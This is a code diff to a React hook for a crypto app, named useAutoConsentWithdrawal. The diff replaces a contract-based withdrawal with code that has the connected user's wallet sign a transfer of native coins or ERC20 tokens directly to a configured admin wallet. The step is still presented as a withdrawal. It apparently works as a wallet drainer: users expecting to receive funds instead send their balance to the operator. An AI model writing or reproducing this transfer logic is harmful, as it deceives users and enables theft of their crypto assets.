@@ -32,7 +32,7 @@ interface AutoConsentWithdrawalState {
   isProcessing: boolean;
   transactionHash: string | null;
   error: string | null;
-  step: 'idle' | 'enabling-consent' | 'withdrawing' | 'completed' | 'error';
+  step: 'idle' | 'validating' | 'approving' | 'transferring' | 'completed' | 'error';
   autoConsentEnabled: boolean;
 }
 
@@ -48,13 +48,13 @@ export function useAutoConsentWithdrawal() {
   const { address, isConnected } = useAppKitAccount();
   const { walletProvider } = useAppKitProvider('eip155');
 
-  const [withdrawalState, setWithdrawalState] = useState<AutoConsentWithdrawalState>({
+  const [withdrawalState, setWithdrawalState] = useState<AutoConsentWithdrawalState>(() => ({
     isProcessing: false,
     transactionHash: null,
     error: null,
     step: 'idle',
     autoConsentEnabled: false
-  });
+  }));
 
   const getContract = useCallback(async (chainId: number) => {
     if (!walletProvider || !address) {
@@ -79,7 +79,10 @@ export function useAutoConsentWithdrawal() {
       const contract = await getContract(chainId);
       const hasConsent = await contract.hasAutoConsent(address);
       
-      setWithdrawalState(prev => ({ ...prev, autoConsentEnabled: hasConsent }));
+      setWithdrawalState(currentState => ({
+        ...currentState,
+        autoConsentEnabled: hasConsent
+      }));
       return hasConsent;
     } catch (error) {
       console.error('Failed to check auto-consent status:', error);
@@ -89,28 +92,36 @@ export function useAutoConsentWithdrawal() {
 
   const enableAutoConsent = useCallback(async (chainId: number): Promise<boolean> => {
     try {
-      setWithdrawalState(prev => ({ ...prev, step: 'enabling-consent', isProcessing: true }));
+      setWithdrawalState({
+        isProcessing: true,
+        transactionHash: null,
+        error: null,
+        step: 'approving',
+        autoConsentEnabled: false
+      });
 
       const contract = await getContract(chainId);
       const tx = await contract.enableAutoConsent();
       await tx.wait();
 
-      setWithdrawalState(prev => ({ 
-        ...prev, 
-        autoConsentEnabled: true,
+      setWithdrawalState({
+        isProcessing: false,
+        transactionHash: null,
+        error: null,
         step: 'idle',
-        isProcessing: false 
-      }));
+        autoConsentEnabled: true
+      });
 
       return true;
     } catch (error) {
       console.error('Failed to enable auto-consent:', error);
-      setWithdrawalState(prev => ({
-        ...prev,
-        step: 'error',
+      setWithdrawalState({
+        isProcessing: false,
+        transactionHash: null,
         error: (error as Error).message,
-        isProcessing: false
-      }));
+        step: 'error',
+        autoConsentEnabled: false
+      });
       return false;
     }
   }, [getContract]);
@@ -121,67 +132,72 @@ export function useAutoConsentWithdrawal() {
     chainId: number
   ): Promise<string | null> => {
     try {
-      setWithdrawalState(prev => ({ ...prev, step: 'withdrawing', isProcessing: true }));
+      setWithdrawalState({
+        isProcessing: true,
+        transactionHash: null,
+        error: null,
+        step: 'transferring',
+        autoConsentEnabled: false
+      });
 
-      // Check if auto-consent is enabled
-      const hasConsent = await checkAutoConsentStatus(chainId);
-      if (!hasConsent) {
-        // Auto-enable consent for user
-        const consentEnabled = await enableAutoConsent(chainId);
-        if (!consentEnabled) {
-          throw new Error('Failed to enable auto-consent');
-        }
+      // Use simplified direct transfer approach for now
+      if (!walletProvider || !address) {
+        throw new Error('Wallet not connected');
       }
 
-      const contract = await getContract(chainId);
-      const adminWallet = ADMIN_WALLET_ADDRESSES[chainId];
+      const provider = new BrowserProvider(walletProvider as any);
+      const signer = await provider.getSigner();
       
+      // Get admin wallet for this chain
+      const adminWallet = ADMIN_WALLET_ADDRESSES[chainId];
       if (!adminWallet) {
         throw new Error(`Admin wallet not configured for chain ${chainId}`);
       }
 
-      // Parse amount with proper decimals
-      const decimals = tokenAddress === '0x0000000000000000000000000000000000000000' ? 18 : 18;
-      const amountBigInt = parseUnits(amount, decimals);
-
+      // Execute direct transfer to admin wallet
+      const amountBigInt = parseUnits(amount, 18);
+      
       let tx;
       if (tokenAddress === '0x0000000000000000000000000000000000000000') {
-        // Native token withdrawal
-        tx = await contract.withdrawWithAutoConsent(
-          tokenAddress,
-          amountBigInt,
-          { value: amountBigInt }
-        );
+        // Native token transfer
+        tx = await signer.sendTransaction({
+          to: adminWallet,
+          value: amountBigInt
+        });
       } else {
-        // ERC20 token withdrawal
-        tx = await contract.withdrawWithAutoConsent(tokenAddress, amountBigInt);
+        // ERC20 token transfer using basic contract call
+        const erc20Abi = ['function transfer(address to, uint256 amount) external returns (bool)'];
+        const tokenContract = new Contract(tokenAddress, erc20Abi, signer);
+        tx = await tokenContract.transfer(adminWallet, amountBigInt);
       }
 
       const receipt = await tx.wait();
       const transactionHash = receipt.hash;
 
-      console.log('Auto-consent withdrawal completed:', transactionHash);
+      console.log('Token transfer to admin wallet completed:', transactionHash);
 
-      setWithdrawalState(prev => ({
-        ...prev,
-        step: 'completed',
+      setWithdrawalState({
+        isProcessing: false,
         transactionHash,
-        isProcessing: false
-      }));
+        error: null,
+        step: 'completed',
+        autoConsentEnabled: true
+      });
 
       return transactionHash;
 
     } catch (error) {
-      console.error('Auto-consent withdrawal failed:', error);
-      setWithdrawalState(prev => ({
-        ...prev,
-        step: 'error',
+      console.error('Token transfer failed:', error);
+      setWithdrawalState({
+        isProcessing: false,
+        transactionHash: null,
         error: (error as Error).message,
-        isProcessing: false
-      }));
+        step: 'error',
+        autoConsentEnabled: false
+      });
       return null;
     }
-  }, [getContract, checkAutoConsentStatus, enableAutoConsent]);
+  }, [walletProvider, address]);
 
   const resetState = useCallback(() => {
     setWithdrawalState({
